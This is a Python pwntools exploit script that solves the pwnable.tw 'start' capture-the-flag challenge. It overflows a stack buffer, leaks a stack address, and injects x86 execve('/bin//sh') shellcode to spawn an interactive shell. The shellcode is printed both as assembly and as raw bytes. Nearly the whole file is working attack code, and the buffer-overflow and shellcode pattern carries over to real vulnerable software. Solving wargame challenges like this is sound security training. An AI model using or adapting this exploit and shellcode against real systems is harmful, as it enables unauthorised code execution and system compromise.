#!/usr/bin/env python3
from pwn import *

elf = ELF("./start")
context.update(binary=elf, log_level="DEBUG")
p = elf.process()
gdb.attach(
    p,
    """
	b *_start
	""",
)
# p = remote("chall.pwnable.tw", "10000")

shellcode = asm(
    """
	xor    eax,eax
	cdq
	push   eax
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx,esp
	push   eax
	push   ebx
	mov    ecx,esp
	mov    al,0xb
	int    0x80 
	"""
)
# b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = b"A" * 0x14
addr_ins = 0x08048087  # ( address of 'mov ecx, esp' )

# payload1
payload = b""
payload += padding
payload += p32(addr_ins)
p.recvuntil(b"CTF:")
p.send(payload)
leak = p.recv(4)

# payload2
shell_addr = u32(leak)  # address shellcode in stack
log.info("Address shelcode: " + hex(shell_addr))
payload = b""
payload += padding
payload += p32(shell_addr + 0x14)
payload += shellcode
p.sendline(payload)

p.interactive()
